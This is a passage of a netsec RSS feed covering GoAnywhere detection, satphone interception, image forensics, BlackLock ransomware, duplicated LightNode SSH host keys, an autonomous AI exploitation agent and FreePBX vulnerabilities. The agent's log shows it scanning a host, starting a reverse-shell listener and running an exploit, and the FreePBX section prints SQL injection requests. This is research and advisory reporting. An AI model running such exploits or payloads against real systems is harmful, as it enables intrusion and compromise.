reference update we discussed above, including a stack trace which signals a valid exploitation attempt and asks the user to check their logs:Who does that? Well, in our opinion, typically vendors whose products are facing ITW exploitation - but we're not experts.It’s all a mystery. We can’t see a path to exploit this without a valid private key. On paper, that should kill the bug dead. On the other hand, this has a perfect 10 CVSS score, and the vendor has published "IoCs," which indicates that it is likely real.And on the other hand, we recently saw a critical CVE in Sitecore that existed purely because… people were copy-pasting machine keys straight from the documentation. At this point, nothing shocks us. CVE assignments feel less like a science and more like a game of darts in the dark.Detection Artefact GeneratorAcross our client base, we used the Authentication Bypass weakness within an impact-less (but still exploitation-based) mechanism to identify unpatched and vulnerable GoAnywhere systems at scale. Today, we're sharing this mechanism:GET /goanywhere/license/Unlicensed.xhtml/watchTowr?javax.faces.ViewState=watchTowr&GARequestAction=activate HTTP/1.1
-If the instance is unpatched, you’ll see the response include a  header with a license request embedded in the  query string parameter:If you don’t see the   parameter, your instance is patched. That’s because the  no longer generates a valid license request token once the fix is applied.: redirect to /license/Unlicensed.xhtml with a valid license request token attached.: redirect to /license/Unlicensed.xhtml with  license request token.No mystery is complete without a few unanswered questions. Despite our usual routine of reverse engineering and creative detours, we’ve ended this one with more questions than usual.Did we miss critical lines of code that makes everything click into place? Will the first reply on social media point out the obvious and send us a working PoC embedded in a meme? Please.Because the alternatives are less comforting. Could this vulnerability already be in active use? Could someone have access to a signed malicious object ready to be sprayed across the Internet or delivered with precision to a single target? Could that be happening right now?One thing is certain: no vendor assigns a CVSS 10 to a purely theoretical bug. We'd advise against leaving GoAnywhere unpatched below 7.8.4 (or Sustain Release 7.6.3).While this mystery continues to evolve, and we're excited to see if anyone takes the baton from us, concerned operators and end users can use our Detection Artefact Generator to check for externally vulnerable instances. The research published by watchTowr Labs is just a glimpse into what powers the watchTowr Platform – delivering automated, continuous testing against real attacker behaviour.By combining Proactive Threat Intelligence and External Attack Surface Management into a single Preemptive Exposure Management capability, the watchTowr Platform helps organisations rapidly react to emerging threats – and gives them what matters most: Gain early access to our research, and understand your exposure, with the watchTowr PlatformREQUEST A DEMO]]></content:encoded></item><item><title>Tiantong-1 and satphone security: Part 2</title><link>https://www.midnightblue.nl/blog/tiantong-1-and-satphone-security-part-2</link><author>/u/2ROT13</author><category>netsec</category><pubDate>Wed, 24 Sep 2025 09:38:25 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[General satphone SIGINT capabilitiesGiven their prominence in matters of national security, it is unsurprising there are many (commercialized) SIGINT capabilities for satphones available. In fact according to an internal publication by the NSA’s Signals Intelligence Directorate (SID) from 2006, contained in the Snowden leaks, GMR-based Thuraya was considered one of the US intelligence community’s top priorities. In addition to satellite-based monitoring capabilities as exemplified by the MENTOR 4 SIGINT satellite closely following the Thuraya 2 satellite, significant investments were made in ground-based collection capabilities using the NSA’s and systems.According to a leaked publication from 2003, the NSA did not have the desired Foreign Satellite interception (FORNSAT) coverage at the time. In these and other publications, a picture emerges of rapidly expanding collection sites numbering 9 in 2002 to 12 (+40 regional) sites in 2012 in addition to collection performed through 2nd party partners via the STATEROOM program.Regional collection happens through Special Collection Service (SCS) units based at embassies and consulates as neatly summarized by Electrospaces. These units not only service interception posts at the embassies themselves but also roll out covert surveillance infrastructure throughout a target country.While no current publications seem to mention Tiantong-1, there is much information available about SIGINT capabilities for GMR-based SATCOM systems such as Thuraya and Inmarsat. Such information can be obtained from public brochures by vendors such as Stratign, Shoghi, and Pegasus Intelligence as well as product brochures from vendors such as L-3 TRL, Rheinmetall, Verint, and Rhode & Schwarz leaked as part of the Wikileaks Spy Files. All of these systems seem to have fairly identical capabilities, architectures, and challenges.They offer passive interception capabilities allowing for:: Including extraction of content (through automatic real-time decryption as described below) and metadata (e.g. spot beam ID, caller numbers, times, cryptographic information, etc.).‍: Though certain vendors state this is considered difficult due to extensive coverage areas and large spot beams, some claim to extract GPS coordinates from handset traffic or achieve geo-location based on network location information or overlap areas.‍: Audio recording, speech analysis (speaker & language identification, keyword spotting, etc.), media carving, OCR, and typical link analysis and dataset querying.Regardless of the GMR version or frequency bands in use, the general operating principle comes down to satellites covering a large geographical area in smaller, focused areas of coverage referred to as . For example, the GMR-1 based Thuraya system consists of several satellites each covering a different geographical area. These areas are then subdivided into dozens of spotbeams each covering hundreds of kilometers.As illustrated below, communications within a single spotbeam take place in the L-band while feeder link communications between gateway stations and satellites take place in C-/Ku-bands in the regional beam.Two-way (duplex) traffic interception is only possible in a limited number of spot beams (depending on distance between spotbeams with similar signal characteristics such as frequencies and timeslots) centered around a monitoring system. , monitoring and intercepting satphone communications presents several challenges related to synchronization (such as differing delays when signals are captured at different geographical points), missing directional traffic (forward/return links), and complexities in mapping captures from spotbeams to those from regional beams. This typically means all available channels need to be intercepted simultaneously even if one's actual area of interest may be limited.‍On the other hand, feeder link communications can be monitored from any location within the satellite’s footprint area. These communications allow for monitoring (but not intercepting) call activity on return links in multiple spotbeams (without requiring spotbeam coverage by a local monitoring system) via received signaling information (which includes geo-location relevant data and caller IDs).‍It should be noted that interception capabilities are not merely constrained by satellite system architectural aspects but also by hardware capabilities such as the numbers of frequency channels that can be monitored simultaneously. Such limitations depend limitations of utilized DSP/FPGA technology and rack space for system modules. In addition, export controls tend to restrict capabilities as well such as artificially limiting the number of simultaneously monitorable calls.While most of the GMR-1 interception equipment discussed here can likely not be repurposed easily against Tiantong, there is plenty of COTS SDR hardware available these days capable of handling S- and C-Band traffic that could serve as the basis for a TT monitoring solution.As leaked documents from a Rhode & Schwarz GMR-2 monitoring system show most satphone monitoring systems consist of several elements:Strategic Monitoring SystemThese systems, sometimes referred to as central stations, are typically capable of continuous live monitoring and interception of terminals in surrounding cluster of spotbeams and include integrated decryption and analytic capabilities. Such systems are likely based at dedicated SIGINT sites or SCS locations.These systems allow for expanding system coverage and full duplex interception capabilities with several additional spotbeams surrounding the remote monitoring system. Remote monitoring systems are typically connected to strategic systems through always-on connections (e.g. PTSN, WAN, or satellite link). Such remote monitoring systems are likely rolled out throughout a country by SCS operators, and likely connect back to the in-country SCS site.‍Tactical Monitoring SystemTactical monitoring systems are for use by operational teams requiring real-time intercept of terminals in areas either lacking spotbeam coverage. These systems are typically highly portable and vehicle-mountable and facilitate otherwise hard-to-obtain terminal uplink interception capabilities up to tens of kilometers within line-of-sight. Optimal usage requires site surveys to determine suitable monitoring location and antenna positioning.Airborne Monitoring SystemIn addition to the above listed stationary monitoring systems, certain vendors also offer airborne satphone monitoring systems for deployment on manned and unmanned aircraft - essentially offering similar advantages to the tactical monitoring system.Supply chain security & 'hard targets'Ever since the NotPetya and SolarWinds incidents supply chain security has been an increasingly hot topic. Worries around (hardware) supply chain security have recently taken on an additional kinetic dimension with the Israeli attacks on pagers and VHF radios operated by Hezbollah in Lebanon.‍The Volkskrant article mentions typical operational security measures taken against supply chain threats to the procured Tiantong smartphones such as trying to ensure non-sequential serial numbers and limited batch sizes (no doubt also opting for diversified manufacturers and points of sale).Interestingly, the leaked NSA ANT catalog shows that as far back as 2008-2009 the NSA had developed a software implant named for the Thuraya 2520 satphone handsets. The implant was described as being deployed through (temporary) physical access to the satphone though remote deployment options (likely via remote exploitation) were being investigated.‍Implantation of Tiantong smartphones will have different considerations from purpose-built Thuraya handsets. On the one hand, such smartphones consist of much more COTS hardware and software (Android on ARM with one of a handful of well-understood basebands) for which a sophisticated adversary likely already has capabilities and/or expertise.But things are a little different for more modern Huawei smartphones since they increasingly rely on Huawei-proprietary software and hardware. Take the Huawei Mate 60 Pro. Starting with HarmonyOS NEXT, Android has been abandoned as the foundation of HarmonyOS in favor of an  running its own native app format. The Kirin 9000S SoC has an integrated Balong 5000 baseband, both by Chinese manufacturer HiSilicon. A publicly available teardown lists a component marked HI1105 which matches HiSilicon’s HI11xx IC used as a WiFi chip by other Huawei Mate smartphones. This means an adversary will have to invest a lot of resources to build new exploits and software/hardware implants for these Huawei phones and their OS, baseband, and Wi-Fi chip – all of which are now proprietary to Huawei. Venezuelan president Nicolás Maduro even seems to believe the Huawei Mate X6 gifted to him simply cannot be hacked by US intelligence agencies.The downside of this approach is that Huawei can no longer benefit so easily from security updates and advances coming in through Western ecosystems and they will increasingly form a self-selecting priority target for Western intelligence agencies (similar to how crimephones self-select for targeting by law enforcement). The opacity of proprietary technology really isn’t much of a barrier either, given Western intelligence’s long-standing targeting of Huawei. In fact, some public security research has already been performed on the HarmonyOS NEXT ecosystem and Balong baseband [1, 2, 3].While the Tiantong ecosystem doesn’t look like brand new magical fairy dust technology, it might make sense for certain parties worried about Western or under-resourced intelligence agencies surveilling regular cellular networks. It essentially forces such agencies to deploy expensive SIGINT capabilities around the right spot beams and while the U.S. can operate unimpeded at SCS sites in virtually all countries surrounding Iran, this isn’t the case for every SIGINT agency everywhere and likely still requires some more perilous rollout of covert infrastructure inside Iran itself. On top of that if no GPS information can be extracted from Tiantong traffic, geolocation becomes far less granular. Depending on caveats mentioned above, cracking its cryptography might prove a tough challenge as well and remote exploitation and supply chain attacks are also likely to be more laborious (for now). Still, good opsec would need to be observed by disabling cellular capabilities and avoiding co-traveling devices. As such, while hardly revolutionary or foolproof - one can see how adopting Tiantong might make sense for certain actors.For those interested in advancing their RF security skills, Midnight Blue will be delivering its Red Team SIGINT training at .This practically-oriented course, aimed at red team operators and pentesters, will teach attendees the fundamentals of RF, SDR, and SIGINT before quickly moving on to effective guidance on identifying and decoding unknown signals as well as exploiting common pitfalls in RF security.‍Where other SDR trainings tend to focus on enterprise and IoT RF protocols such as 4G/5G, WiFi, RFID, and BT, this training focuses on important but rarely addressed RF technologies such as automotive, aviation, marine, and physical access control RF protocols and mission-critical radio (e.g. TETRA, DMR, P25) used by police, military, private security, and critical infrastructure.Hands-on exercises such as intercepting and decrypting handheld radio comms and breaking automotive security systems are alternated with thorough overviews of relevant RF protocols and their security posture as well as case studies of real-world RF attacks on railways, water utilities, drones, and police/military radios.An overview of the course can be found ‍]]></content:encoded></item><item><title>Tea continued - Unauthenticated access to 150+ Firebase databases, storage buckets and secrets</title><link>https://ice0.blog/docs/openfirebase</link><author>/u/Woowowow91</author><category>netsec</category><pubDate>Tue, 23 Sep 2025 18:44:24 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Image Forensics: Detecting AI Fakes with Compression Artifacts</title><link>https://dmanco.dev/2025/09/15/basics-of-image-forensics-1.html</link><author>/u/Doch88</author><category>netsec</category><pubDate>Tue, 23 Sep 2025 16:47:03 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Let’s start with some context. Why am I writing this post?I work at Fourthline, a company that manages the Know Your Customer (KYC) process for companies like Revolut, TradeRepublic, and N26. 
-For those who don’t know what KYC is, think of when you register online to use one of these services and are asked to take a selfie and a picture of your ID document to prove you are who you claim to be. 
-That’s KYC in a nutshell, and as you may guess, we don’t want fraudsters to slip through. If you’ve ever played Papers, Please, you can imagine this isn’t always easy. Fraudsters are getting better, and technology is helping them. 
-Deepfakes and AI-generated selfies and documents have become some of their tools, and my job at Fourthline is also to fight this kind of AI. 
-Yes, I’m an AI engineer who fights AI. A sort of cyberwar destined to become even more challenging as technology advances. But to fight deepfakes, I should also study how similar problems were handled in the past. 
-Image manipulation has existed for decades, long before generative models reached today’s quality. 
-So let’s go back to 2007 and talk about compression and Error Level Analysis (ELA).Almost every image on the internet is compressed; handling uncompressed images everywhere would be too expensive. 
-Let’s look at an example. I took an image with my camera with a resolution of 6000x4000. 
-Quick math: that’s 24,000,000 pixels. Every pixel stores information about color, and color in computer science is usually expressed with 8 bits. 
-To cover most colors, we need three channels — red, green, and blue — so every pixel carries 8 × 3 bits of information. The weight of this image should be 6000 × 4000 × 8 × 3 = 576,000,000 bits, or 72 megabytes. 
-Instead, it weighs only 6 megabytes. JPEG is the most widely used image compression algorithm. In simple terms, the algorithm works by removing parts of the image that are barely noticeable to the human eye. It has a parameter called  that sets how aggressive the compression is.
-A quality of 100% means very little is removed, while 1% means heavy information loss. Because information is lost, the image content is altered in subtle ways. If you look at the single pixel values, you’ll notice differences. Depending on the chosen quality, these differences may be invisible to the eye but still exist. 
-These differences are a trace left by the JPEG compression, a sort of fingerprint. We call them . Now the interesting part comes.  
-Since JPEG compression is applied to the entire image, these artifacts should always be  inside the image. 
-If the image is tampered with in some way - say an object is removed in Photoshop - this will affect the JPEG artifacts as well.
-You would notice an inconsistency of these artifacts in the particular area of the image that was altered. 
-And this is exactly what ELA is based on.Take the image to analyzeCompress it again with JPEG at a chosen quality - this will become a parameter of ELACalculate the difference between the two imagesThe result is an ELA map to interpret.  
-The assumption here is that the image (or parts of it) was compressed with JPEG at some point. Let’s use a toy example to explain how it works. Using something from my domain of work, let’s consider this specimen of a French national ID card. Suppose I know it was compressed at JPEG quality 95%. I’ll use that later. 
-Now, I inpaint the image with an AI model and get this:And, importantly, I save this deepfake in PNG format. 
-Unlike JPEG, PNG uses  compression, meaning no information is lost. Now, using the information above, we perform ELA with a .
-In this way, the part of the image that was already compressed with the same quality factor should not produce any new artifact.The tampered area is obvious. We successfully detected the deepfake ID and blocked a fraudster. But in reality, you may not know the original JPEG quality, and it’s unlikely that the manipulated image (previously a JPEG) would be saved as PNG.Now let’s assume the deepfake was saved as JPEG. 
-We don’t know the quality factor. We only know that if the image was altered, part of it will be double-compressed and part single-compressed, producing inconsistency.We perform ELA with JPEG quality 80% for both images.Now ELA feels more like art. 
-There’s a clear difference, but without knowing tampering occurred, could you detect it from the map alone? 
-To better understand how to interpret an ELA map, we can take some notes from how JPEG works: JPEG creates more artifacts in high-contrast areas (like text or borders), making ELA brighter there.Flat surfaces should have uniform ELA values.Similar textures should produce similar ELA.If some part of the image doesn’t respect these ‘rules’, then it might be suspicious. Like the deepfaked face on the ID, with a suspiciously bright ELA. 
-For more tips, see FotoForensics and their tutorials.So, can ELA be a solution to detect AI-manipulated images? 
-No, not by itself anyway. ELA is just a tool in the Image Forensics toolbox that can help fight deepfakes. 
-But many other things can be used together with ELA, such as EXIF information, PRNU, PCA and so on. 
-And probably some of these techniques will be the topic for another post.]]></content:encoded></item><item><title>BlackLock Ransomware: From Meteoric Rise to Sudden Disruption</title><link>https://wealthari.com/blacklock-ransomware-from-meteoric-rise-to-sudden-disruption/</link><author>/u/Koyaanisquatsi_</author><category>netsec</category><pubDate>Tue, 23 Sep 2025 07:35:57 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[ has quickly climbed the ranks in the global ransomware scene, setting new benchmarks for attack frequency and technical complexity. Emerging in March 2024 under the name El Dorado, the group rapidly rebranded and, by late 2024, was responsible for a 1,425% surge in data leak site posts, making it the fifth most active ransomware group worldwide by January 2025.Advanced Attack Techniques & Double ExtortionBlackLock distinguishes itself by deploying custom-built malware—eschewing leaked builder kits common among competitors—and leveraging a cross-platform approach that targets Windows, Linux, and VMware ESXi environments. The ransomware utilizes the powerful ChaCha20 stream cipher and advanced ECDH key exchange mechanisms to encrypt files and metadata, rendering standard recovery methods useless.BlackLock’s double extortion tactic combines file encryption with the exfiltration of sensitive data: victims are threatened with both permanent data loss and public exposure unless they pay the ransom. Encrypted files are renamed with randomized strings and extensions, and ransom notes are left titled “HOW_RETURN_YOUR_DATA.TXT” in compromised folders.Operations Disrupted by Major Security BreachIn March 2025, BlackLock faced an unprecedented disruption. Cybersecurity researchers from Resecurity exploited a vulnerability in the group’s data leak site, exposing its infrastructure, clearnet IPs, and MEGA storage accounts for stolen data. The situation escalated when the rival DragonForce group defaced BlackLock’s site and leaked configuration details—forcing BlackLock and its affiliates offline for the foreseeable future.Ongoing Threats and Industry ImpactDespite the recent dismantling, BlackLock’s legacy remains concerning. Its aggressive recruitment strategies, particularly on the Russian-language forum RAMP, and its unique technical sophistication have made it a blueprint for future ransomware operations. With attacks striking public services, technology firms, manufacturing, and government agencies across several countries, analysts warn that the threat model established by BlackLock will influence ransomware trends throughout 2025.Security experts recommend organizations invest in robust backup solutions, network segmentation, comprehensive endpoint protection, and regular patch management to mitigate risks from similar cross-platform ransomware threats. Proactive monitoring and intelligence sharing remain critical in defending against evolving attack methodologies pioneered by groups like BlackLock.]]></content:encoded></item><item><title>Journeys in Hosting 1/x - Precomputed SSH Host Keys</title><link>https://dataplane.org/jtk/blog/2025/09/hosting-stories-1/</link><author>/u/jtkchicago</author><category>netsec</category><pubDate>Mon, 22 Sep 2025 22:05:04 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[In what I hope will be the debut of many in a series to come, I want to
-share my experience and musings as a frequent traveler in the world of
-hosting providers.  Sometimes it will be just curious anomalies, of
-little interest to but a few.  But perhaps some tales told here will
-ultimately prove valuable to others looking for insight even if to
-obscure scenarios.  Maybe especially to obscure scenarios.This inaugural article will focus on the unusual and curious operational
-behavior of precomputed SSH host keys in default system installs by
-LightNode.LightNode is the server hosting brand of Kaopu Cloud, a global network
-services provider based in China.  They have been providing KVM-based
-hosting for approximately four years as of this writing. A compelling
-feature of LightNode’s offerings is the rather unique set of data center
-markets they operate in.  Otherwise, most of the capabilities the
-LightNode platform has are similar to many global hosting providers.
-The one notable exception is they do not currently offer native IPv6
-addressing and connectivity.“[ASN-DROP entries are] associated with the worst of the worst
-behavior. These are ASNs that our researchers wouldn’t recommend
-engaging with and are highly likely to announce or supply transit to
-IP ranges associated with malicious behavior. From networks hosting
-botnet command and control systems, to “bulletproof” networks selling
-connectivity/hosting to cyber criminals, to hardcore spammers, and
-more.”Despite appearing in ASN-DROP, LightNode is relatively popular and
-seemingly widely used by many.  At the time of this writing the
-originating AS announces the equivalent of about three /16 IPv4 prefixes
-or roughly 180 thousand addresses.  Far fewer than the biggest cloud
-providers, and about an order of magnitude less than Linode (AS 63949)
-has for example, but still more than what most .edu’s hold.To setup a new system through LightNode’s user interface you choose a
-location, system type, system version if applicable, and minimum
-resource requirements to name a few configurable options.A system type may be a vanilla operating system image such as Ubuntu,
-Debian, AlmaLinux, Arch Linux, CentOS, FreeBSD, Rocky Linux, or Windows.
-For most OS types there are usually a few different versions to choose
-from.  There are over a dozen application-specific system types if you
-want a preconfigured Docker or WordPress system for example.  This
-process is straightforward and would seem familiar to anyone who has had
-experience using other hosting providers.  There is nothing particularly
-special about this process.  However, there is one very specific,
-default configuration detail on most if not all the LightNode installed
-systems I’ve not seen replicated by any other hosting provider.Each of LightNode’s Unix-based system options will install an OpenSSH
-server listening on TCP port 22 by default.  You have the option of
-specifying access to the SSH service with a public key or password.
-Normally, the SSH server host keys are generated as part of the package
-installation process using the  utility.  This would result
-in one-time unique pairs of keys for each and every system.  This is
-where LightNode seems to do something very different than every other
-hosting provider I’m aware of.I tested a number of configurations and performed a survey of LightNode SSH
-servers listening on TCP port 22 to support this claim.  The table below shows
-the number of TCP port 22 SSH listeners, distinct host keys, and distinct key
-types I found:We would not expect to see so few keys compared to the number of TCP port 22
-listeners.  Most modern Unix-based systems would have two or three different
-and unique keys per system, so in theory we’d expect see roughly 60,000 to
-90,000 keys.  Instead, on average we see at least 25 addresses for every key.
-In fact it is a worse than that, because 1228 represents all key types and most
-hosts use three key types on average.  If we consider only  keys,
-the most common type, this is what emerges:The number of listeners that have an ssh-rsa host key is 98.5% of the
-original count, but the number of unique keys is now 39% of the
-original.  This is is significant amount of SSH host key duplication
-across LightNode’s infrastructure.This leads us to ask at least one more question.  If there are 478
-distinct ssh-rsa host keys, how many times are each of those keys used?
-Surely LightNode doesn’t have 478 different system types does it?  No,
-it is something less than that.  We might not know exactly what the
-unique count is given that some templates may been retired, but we can
-examine keys by popularity.  A table of statistics starts to get a
-little messy so I’ll simply tell you that the most popular ssh-rsa key
-is associated with LightNode’s Ubuntu 22.04 template.  It is seen on
-over 10,000 Listener addresses!  About one in three LightNode systems
-with a public SSH listener on TCP port run Ubuntu 22.04 and all use the
-same SSH host key.So LightNode appears to have precomputed SSH host keys for each of the
-unique system templates it offers as an install option.  For example,
-all LightNode Debian 12 installations, by default, will use the same SSH
-host key pairs that you’ll find stored in 
-files.  Debian 11 will use another set of keys, but common to all Debian
-11 installations.  And so on.  It is unclear if this is a failure of
-entropy or if ssh-keygen is just never run, but the outcome is the same.
-The host keys are predictable and shared with other hosts built from the
-same system template configuration.I can think of two scenarios where this anomaly might purposely occur in
-practice.  One, some hosts have multiple addresses assigned, and each
-address has the same SSH server daemon active and willing to accept
-connections across all interfaces.  In this case you’d see what looks
-like a multi-homed system.  Honeypots may exhibit this behavior for
-example.  Two, each listener address may be a different system, but host
-keys are being generated from the exact same entropy source for
-ssh-keygen, or are set to use precomputed ssh host keys.  You might find
-this in certain enterprise or private environments as a way to simplify
-key management.  It is this second scenario that LightNode appears to
-fall into.It is unclear why LightNode sets up the SSH listener this way for
-public, independent systems.  Perhaps the platform designer thought this
-would speed-up system setup and VM creation time?  Should we care about
-this?  Is it really bad?  Could this be something more insidious?  What,
-if anything, do we do?Exposure of private encryption keys is a bad thing, and potentially
-catastrophic.  However, when it comes to SSH server host keys, the
-damage is not as great as it might be compared to other public key
-systems.  SSH server host keys are used to “identify” the system.  An
-impersonation attack is feasible here.  That is, if someone hijacked the
-SSH server IP address and used the same SSH host keys, an unwitting
-client would not receive an authentication warning, because from the
-perspective of the SSH protocol, it looks like the same system.  A
-hijack, or MitM attack, of this sort might then be able to capture and
-decrypt communications from there on out.  However, even if past traffic
-was captured and the SSH server host keys are known, a separate session
-key is used for traffic encryption that cannot be easily derived without
-direct access to an end system at the time of operation.  In the
-immortal words of the The Hitchhiker’s Guide to the Galaxy: Don’t Panic.Nevertheless, this scenario is less than ideal.  I tried to contact
-LightNode support about this.  I also tried to reach out to
-CNCERT/CC, the national computer network
-emergency response technical team / coordination center of China.  A
-colleague also tried to communicate with a CNCERT contact on my
-behalf.  These attempts have been met with silence.  I’d guess this may
-help explain why the ASN is listed on the Spamhaus ASN-DROP.  Perhaps,
-as another colleague once put it, the difference in our native languages
-can act as a natural firewall between us.Technically LightNode or someone with the ability to hijack LightNode
-addresses could impersonate SSH servers there. I’m inclined to accept
-this is a relatively low probability threat, and likely an unintentional
-vulnerability on LightNode’s part.  If you’re a LightNode customer, it
-would be wise to setup new host keys.  If you or anyone you know has any
-ability to convince LightNode to alter this practice, I’d be happy to
-hear about it.]]></content:encoded></item></channel></rss>
+[*] Scanning target: 192.168.1.100 (Ports: default)
+[Agent] Thought: I need to first scan the target to identify services
+[Agent] Action: scan_target
+[Agent] Observation: Port 22 open - OpenSSH 7.4...
+[*] Searching exploits for: OpenSSH 7.4
+[Agent] Thought: Found potential exploits, analyzing...
+[*] Mirroring exploit ID: 45233
+[*] Reading exploit code: 45233.py
+[Agent] Thought: This is a reverse shell requiring LHOST/LPORT...
+[*] Starting background listener on port 4444
+[*] Executing command: python3 45233.py...
+This tool is . Use it responsibly:Use in authorized penetration testsUse in isolated lab environments (like HackTheBox, TryHackMe)Keep logs of all activitiesUse on systems without authorizationUse on production networks without approvalSkip the manual review of exploitsConclusion: The Future is Open-SourceWe’ve built a fully autonomous exploitation framework powered by a model so small it fits on a USB drive. This proves that AI-assisted cybersecurity doesn’t require deep pockets, expensive APIs or cloud dependencies.Small models can be surprisingly capable when properly tool-augmentedOpen-source AI is production-ready for specialized domains provide a powerful framework for autonomous workflows preserves privacy and reduces costs to zeroSystem prompting is an art that makes or breaks agent performanceThis is just the beginning. Imagine: that adapt to new CVEs automatically that think creatively like human hackers that detect and respond to intrusions in real-timeAll running locally, all open-source, all freeThe democratization of AI-powered security tools is here. The question is: what will you build with it?: I’m Mohit Dabas, a cybersecurity professional passionate about building innovative security tools. Follow my journey as I explore the intersection of AI and cybersecurity.Remember: With great power comes great responsibility. Use this knowledge ethically and legally.]]></content:encoded></item><item><title>The FreePBX Rabbit Hole: CVE-2025-66039 &amp; More</title><link>https://horizon3.ai/attack-research/the-freepbx-rabbit-hole-cve-2025-66039-and-others/</link><author>/u/scopedsecurity</author><category>netsec</category><pubDate>Fri, 12 Dec 2025 13:56:46 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Examining multiple vulnerabilities in FreePBXWe discovered an authentication bypass affecting the webserver authentication type (CVE-2025-66039), numerous authenticated SQL injections (CVE-2025-61675) and an authenticated file upload leading to remote code execution (CVE-2025-61678) in FreePBX. These vulnerabilities are easily exploitable and enable authenticated/unauthenticated remote attackers to achieve remote code execution on vulnerable FreePBX instances. These issues are patched in FreePBX versions 16.0.42, 16.0.92, 17.0.6, 17.0.22. It is important to note that the authentication bypass is not vulnerable in the default configuration of FreePBX.The product at the center of the issue is FreePBX. FreePBX is an open source IP PBX management tool which is a modern phone system for businesses that use VoIP to make and receive phone calls. Given the nature of the product, FreePBX installations have a lot of moving parts and require relatively open access and availability. This makes it an ideal target for attackers.Back in October, when a security advisory came out for FreePBX indicating an authentication bypass leading to SQL injection and remote code execution, aka CVE-2025-57819, researchers at Horizon3.ai started investigating since the issue was being exploited in the wild. It also was added to the CISA KEV list due to exposure and impact. For a while, nobody knew the exploit and AI slop exploits were doing their rounds on GitHub, which led to a spray and pray of exploits that were not the actual exploit.What’s interesting, however, is that during our research, what we first thought was the authentication bypass and SQL injection leading to remote code execution actually turned out to be new vulnerabilities and were unrelated to CVE-2025-57819. We disclosed these new findings to FreePBX, which resulted in three separate advisories. A list of all recent vulnerabilities for FreePBX can be found here at FreePBX’s GitHub Security Reporting.As of today, the authentication bypass that does not rely on auth type webserver CVE-2025-57819 has gained the most attention and exploitation for good reason. It’s vulnerable in the default configuration of FreePBX and is an authentication bypass that leads to SQL injection and Remote Code Execution by inserting OS commands into the MySQL  table. Therefore, any SQL injections found can also result in remote code execution. Other payloads included adding users to the table or exfiltrating sensitive data.Is my FreePBX vulnerable?After discovering these vulnerabilities, we checked our customer base for exposure and did not find any customers vulnerable to these newly discovered issues. The main pre-requisite for unauthenticated exploitation is having FreePBX configured with either “webserver” authentication type or no authentication at all, but who would do that?😏Checking exposure on Shodan for FreePBX yields the following results:http.title:"freepbx" 11,907 results http.favicon.hash:"-1908328911" 10,977 resultshttp.favicon.hash:"1574423538" 398 resultshttp.title:"freepbx administration" 9,648Based on our assessment of customer environments the authentication bypass does not look widespread since default FreePBX instances come with as the authentication type. The SQL injections and file upload exist regardless of authentication type, but a valid  is still required.Detecting a FreePBX instance with an auth type webserver can be done by making a simple request without an Authorization header. Resulting in a verbose error message indicating we are missing the Authorization header.CVE-2025-61675 – Multiple SQL InjectionsDuring our research, we found four unique endpoints and 11 affected parameters vulnerable to SQL injection. Each issue allows for the same read and write access to the SQL database.SQL Injection BasestationA SQL injection vulnerability exists in the FreePBX Endpoint Management module affecting multiple parameters in the basestation configuration functionality. While authentication is required, the aforementioned authentication bypass is sufficient to exploit this issue. A known username appears to be required, though the default admin user appears sufficient.name, brand, template, acPOST /admin/config.php?display=endpoint&new=1&view=basestation HTTP/1.1Host: 10.2.21.156Authorization: Basic YWRtaW46YWRtaW4=User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brReferer: https://10.2.21.156/admin/config.php?display=endpoint&view=basefile&brand=aastra&template=testContent-Type: application/x-www-form-urlencodedContent-Length: 252Origin: https://10.2.21.156Upgrade-Insecure-Requests: 1Sec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1Te: trailersid=&name='AD&brand=Sangoma&template=sangoma_default&mac=aabbccddeeff&ac=&repeater1=&repeater2=&repeater3=&multicell=no&sync_chain_id=512&sync_time=60&sync_data_transport=multicast&primary_data_sync_ip=0.0.0.0&sync_debug_enable=0&action=save_basestationHTTP/1.0 500 Internal Server ErrorDate: Mon, 08 Sep 2025 15:03:02 GMTLast-Modified: Mon, 08 Sep 2025 15:03:02 GMTExpires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidateX-Frame-Options: SAMEORIGINSet-Cookie: PHPSESSID=rkq36p1hdglarnsjkipup8284t; expires=Wed, 08 Oct 2025 15:03:02 GMT; Max-Age=2592000; path=/Set-Cookie: lang=en_USContent-Type: text/html;charset=UTF-8PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'AD', 'AABBCCDDEEFF', '', 'Sangoma', 'sangoma_default', 'NULL', 'NULL', 'NULL'…' at line 2 in file /var/www/html/admin/modules/endpoint/views/page.endpoint.php on line 1354Stack trace:1. PDOException->() /var/www/html/admin/modules/endpoint/views/page.endpoint.php:13542. PDOStatement->execute() /var/www/html/admin/modules/endpoint/views/page.endpoint.php:13543. unknown() /var/www/html/admin/modules/endpoint/page.endpoint.php:104. include() /var/www/html/admin/config.php:658A SQL injection vulnerability exists in the FreePBX Endpoint Management module affecting multiple parameters in the firmware configuration functionality. While authentication is required, the aforementioned authentication bypass is sufficient to exploit this issue. A known username appears to be required, though the default admin user appears sufficient.brandPOST /admin/config.php?display=endpoint&view=firmware&brand=aastra HTTP/1.1Host: 10.2.21.156Authorization: Basic YWRtaW46YWRtaW4=User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brReferer: 